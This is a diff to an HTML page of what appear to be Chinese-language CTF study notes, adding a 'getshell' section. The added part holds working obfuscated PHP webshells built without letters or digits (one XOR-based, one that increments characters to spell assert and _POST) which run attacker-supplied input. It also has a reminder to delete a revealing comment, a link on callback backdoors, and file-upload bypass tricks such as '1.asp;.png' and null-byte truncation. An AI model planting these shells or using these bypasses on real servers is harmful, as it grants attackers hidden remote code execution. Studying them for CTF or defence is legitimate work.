@@ -107,7 +107,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#getshell" tabindex="1" class="md-skip">
+      <a href="#shell-php5" tabindex="1" class="md-skip">
         跳转至
       </a>
     
@@ -1335,8 +1335,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../../ctf/CTFstudy/" title="学习基本思路" class="md-nav__link">
-      学习基本思路
+    <a href="../../ctf/CTFstudy/" title="CTFstudy" class="md-nav__link">
+      CTFstudy
     </a>
   </li>
 
@@ -1452,6 +1452,18 @@
   <li class="md-nav__item">
     <a href="../../ctf/misc/misc/" title="Misc" class="md-nav__link">
       Misc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../ctf/misc/webasm/" title="Webasm" class="md-nav__link">
+      Webasm
     </a>
   </li>
 
@@ -1624,6 +1636,18 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../ctf/web/ssti/" title="Ssti" class="md-nav__link">
+      Ssti
+    </a>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -1756,6 +1780,20 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#shell-php5" title="不包含数字和字母的shell（待验证） php5" class="md-nav__link">
+    不包含数字和字母的shell（待验证） php5
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="回调后门" class="md-nav__link">
+    回调后门
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#getshell" title="getshell" class="md-nav__link">
     getshell
   </a>
@@ -1839,6 +1877,20 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#shell-php5" title="不包含数字和字母的shell（待验证） php5" class="md-nav__link">
+    不包含数字和字母的shell（待验证） php5
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="回调后门" class="md-nav__link">
+    回调后门
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#getshell" title="getshell" class="md-nav__link">
     getshell
   </a>
@@ -1872,7 +1924,67 @@
                 
                   <h1>Getshell</h1>
                 
-                <h2 id="getshell">getshell<a class="headerlink" href="#getshell" title="Permanent link">&para;</a></h2>
+                <h2 id="shell-php5">不包含数字和字母的shell（待验证） php5<a class="headerlink" href="#shell-php5" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z0-9]/is&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">]);</span>
+<span class="p">}</span>
+</pre></div>
+
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$__</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="o">&gt;</span><span class="s1">&#39;&lt;&#39;</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="o">&gt;</span><span class="s1">&#39;&lt;&#39;</span><span class="p">);</span>
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$__</span><span class="o">/</span><span class="nv">$__</span><span class="p">;</span>
+
+<span class="nv">$____</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;瞰&quot;</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;和&quot;</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;和&quot;</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;的&quot;</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;半&quot;</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;始&quot;</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span>
+
+<span class="nv">$_____</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="p">;</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;俯&quot;</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;瞰&quot;</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;次&quot;</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;站&quot;</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span>
+
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$$_____</span><span class="p">;</span>
+<span class="nv">$____</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="nv">$__</span><span class="p">]);</span>
+</pre></div>
+
+<div class="codehilite"><pre><span></span><span class="x">// ASSERT($_POST[_]); 记得删除注释</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$_</span><span class="o">=</span><span class="p">[];</span>
+<span class="nv">$_</span><span class="o">=@</span><span class="s2">&quot;</span><span class="si">$_</span><span class="s2">&quot;</span><span class="p">;</span> <span class="c1">// $_=&#39;Array&#39;;</span>
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="s1">&#39;!&#39;</span><span class="o">==</span><span class="s1">&#39;@&#39;</span><span class="p">];</span> <span class="c1">// $_=$_[0];</span>
+<span class="nv">$___</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span> <span class="c1">// A</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span> <span class="c1">// S</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span> <span class="c1">// S</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// E </span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// R</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// T</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+
+<span class="nv">$____</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// P</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// O</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// S</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// T</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$$____</span><span class="p">;</span>
+<span class="nv">$___</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="nx">_</span><span class="p">]);</span> 
+</pre></div>
+
+<h2 id="_1">回调后门<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
+<h2 id="getshell">getshell<a class="headerlink" href="#getshell" title="Permanent link">&para;</a></h2>
 <p>目录解析 1.asp/1.png
 分号阶段 1.asp;.png
 改包 00截断</p>
